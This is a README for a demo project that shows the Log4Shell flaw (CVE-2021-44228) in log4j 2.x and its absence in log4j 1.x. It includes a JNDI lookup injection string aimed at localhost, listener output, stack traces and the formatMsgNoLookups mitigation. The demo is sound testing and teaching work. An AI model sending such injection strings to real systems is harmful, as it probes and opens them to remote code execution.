# test-44228

A simple example for [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

Implements two java CLIs, one using log4j v1.x, the other using log4j 2.x to demonstrate the log4shell vulnerability.

See also:

- https://www.lunasec.io/docs/blog/log4j-zero-day/
- https://www.oracle.com/security-alerts/alert-cve-2021-44228.html

## Usage

### Vulnerable Log4J2

1. Start a listener on some server (localhost or remote), e.g.:

```
$ sudo tcpdump -i any tcp port 1234
tcpdump: data link type PKTAP
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on any, link-type PKTAP (Apple DLT_PKTAP), capture size 262144 bytes
```

2. Run the vulnerable app:

```
mvn compile exec:java \
  -Dexec.mainClass="com.beehivebeach.AppL4J2" \
  -Dexec.args="'\${jndi:ldap://127.0.0.1:1234/test}'"
```

The listener will report a connection:

```
10:19:37.600368 IP localhost.56945 > localhost.search-agent: Flags [S], seq 1972103573, win 65535, options [mss 16344,nop,wscale 6,nop,nop,TS val 3783661067 ecr 0,sackOK,eol], length 0
10:19:37.600380 IP localhost.56945 > localhost.search-agent: Flags [S], seq 1972103573, win 65535, options [mss 16344,nop,wscale 6,nop,nop,TS val 3783661067 ecr 0,sackOK,eol], length 0
10:19:37.600386 IP localhost.search-agent > localhost.56945: Flags [R.], seq 0, ack 1972103574, win 0, length 0
10:19:37.600388 IP localhost.search-agent > localhost.56945: Flags [R.], seq 0, ack 1, win 0, length 0
```

and the java app will report an exception:

```
$ mvn compile exec:java \
  -Dexec.mainClass="com.beehivebeach.AppL4J2" \
  -Dexec.args="'\${jndi:ldap://127.0.0.1:1234/test}'"
[INFO] Scanning for projects...
[INFO]
[INFO] --------------------< com.beehivebeach:test-44228 >---------------------
[INFO] Building test-44228 1.0-SNAPSHOT
[INFO] --------------------------------[ jar ]---------------------------------
[INFO]
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ test-44228 ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 1 resource
[INFO]
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ test-44228 ---
[INFO] Nothing to compile - all classes are up to date
[INFO]
[INFO] --- exec-maven-plugin:3.0.0:java (default-cli) @ test-44228 ---
Arguments (1) :
2021-12-11 10:19:37,602 com.beehivebeach.AppL4J2.main() WARN Error looking up JNDI resource [ldap://127.0.0.1:1234/test]. javax.naming.CommunicationException: 127.0.0.1:1234 [Root exception is java.net.ConnectException: Connection refused (Connection refused)]
	at com.sun.jndi.ldap.Connection.<init>(Connection.java:243)
	at com.sun.jndi.ldap.LdapClient.<init>(LdapClient.java:137)
	at com.sun.jndi.ldap.LdapClient.getInstance(LdapClient.java:1615)
	at com.sun.jndi.ldap.LdapCtx.connect(LdapCtx.java:2849)
	at com.sun.jndi.ldap.LdapCtx.<init>(LdapCtx.java:347)
	at com.sun.jndi.url.ldap.ldapURLContextFactory.getUsingURLIgnoreRootDN(ldapURLContextFactory.java:60)
	at com.sun.jndi.url.ldap.ldapURLContext.getRootURLContext(ldapURLContext.java:61)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:202)
	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
	at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)
	at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:223)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1060)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:982)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:878)
	at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:433)
	at org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132)
	at org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38)
	at org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:345)
	at org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244)
	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229)
	at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190)
	at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181)
	at org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120)
	at org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84)
	at org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:543)
	at org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:502)
	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:485)
	at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:460)
	at org.apache.logging.log4j.core.config.AwaitCompletionReliabilityStrategy.log(AwaitCompletionReliabilityStrategy.java:82)
	at org.apache.logging.log4j.core.Logger.log(Logger.java:161)
	at org.apache.logging.log4j.spi.AbstractLogger.tryLogMessage(AbstractLogger.java:2198)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessageTrackRecursion(AbstractLogger.java:2152)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessageSafely(AbstractLogger.java:2135)
	at org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:2011)
	at org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:1983)
	at org.apache.logging.log4j.spi.AbstractLogger.info(AbstractLogger.java:1320)
	at com.beehivebeach.AppL4J2.main(AppL4J2.java:35)
	at org.codehaus.mojo.exec.ExecJavaMojo$1.run(ExecJavaMojo.java:254)
	at java.lang.Thread.run(Thread.java:748)
Caused by: java.net.ConnectException: Connection refused (Connection refused)
	at java.net.PlainSocketImpl.socketConnect(Native Method)
	at java.net.AbstractPlainSocketImpl.doConnect(AbstractPlainSocketImpl.java:350)
	at java.net.AbstractPlainSocketImpl.connectToAddress(AbstractPlainSocketImpl.java:206)
	at java.net.AbstractPlainSocketImpl.connect(AbstractPlainSocketImpl.java:188)
	at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:392)
	at java.net.Socket.connect(Socket.java:607)
	at java.net.Socket.connect(Socket.java:556)
	at java.net.Socket.<init>(Socket.java:452)
	at java.net.Socket.<init>(Socket.java:229)
	at com.sun.jndi.ldap.Connection.createSocket(Connection.java:380)
	at com.sun.jndi.ldap.Connection.<init>(Connection.java:220)
	... 44 more

10:19:37.588 [com.beehivebeach.AppL4J2.main()] INFO  com.beehivebeach.AppL4J2 - 0: ${jndi:ldap://127.0.0.1:1234/test}
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.002 s
[INFO] Finished at: 2021-12-11T10:19:37-05:00
[INFO] ------------------------------------------------------------------------
```

3. Run with `-Dlog4j2.formatMsgNoLookups=true` to demonstrate no exteneral connection. The listener will not report a connection and the connection failed exception is not reported:

```
$ mvn compile exec:java \
  -Dexec.mainClass="com.beehivebeach.AppL4J2" \
  -Dexec.args="'\${jndi:ldap://127.0.0.1:1234/test}'" \
  -Dlog4j2.formatMsgNoLookups=true

[INFO] Scanning for projects...
[INFO]
[INFO] --------------------< com.beehivebeach:test-44228 >---------------------
[INFO] Building test-44228 1.0-SNAPSHOT
[INFO] --------------------------------[ jar ]---------------------------------
[INFO]
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ test-44228 ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 1 resource
[INFO]
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ test-44228 ---
[INFO] Nothing to compile - all classes are up to date
[INFO]
[INFO] --- exec-maven-plugin:3.0.0:java (default-cli) @ test-44228 ---
Arguments (1) :
10:23:16.555 [com.beehivebeach.AppL4J2.main()] INFO  com.beehivebeach.AppL4J2 - 0: ${jndi:ldap://127.0.0.1:1234/test}
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  1.000 s
[INFO] Finished at: 2021-12-11T10:23:16-05:00
[INFO] ------------------------------------------------------------------------  
```

### Not vulnerable, Log4J v1.x

1. Start a listener as before

2. Run the log4j v1 app:

```
$ mvn compile exec:java \
  -Dexec.mainClass="com.beehivebeach.AppL4J1" \
  -Dexec.args="'\${jndi:ldap://127.0.0.1:1234/test}'"
[INFO] Scanning for projects...
[INFO]
[INFO] --------------------< com.beehivebeach:test-44228 >---------------------
[INFO] Building test-44228 1.0-SNAPSHOT
[INFO] --------------------------------[ jar ]---------------------------------
[INFO]
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ test-44228 ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] Copying 1 resource
[INFO]
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ test-44228 ---
[INFO] Nothing to compile - all classes are up to date
[INFO]
[INFO] --- exec-maven-plugin:3.0.0:java (default-cli) @ test-44228 ---
Arguments App 1 (1) :
0 [com.beehivebeach.AppL4J1.main()] INFO com.beehivebeach.AppL4J1  - 0: ${jndi:ldap://127.0.0.1:1234/test}
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.682 s
[INFO] Finished at: 2021-12-11T10:26:04-05:00
[INFO] ------------------------------------------------------------------------
```


